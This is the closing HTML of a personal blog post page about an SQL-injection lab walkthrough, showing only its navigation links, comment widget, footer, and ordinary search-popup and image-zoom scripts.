+</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/07/08/XXElab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" rel="prev" title="XXElab通关记录"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">XXElab通关记录</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/08/javascript%E5%9F%BA%E7%A1%80/" rel="next" title="javascript基础"><span class="post-nav-text">javascript基础</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>您需要科学上网，才可使用评论区功能。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/07/08/sqlilab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2022 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
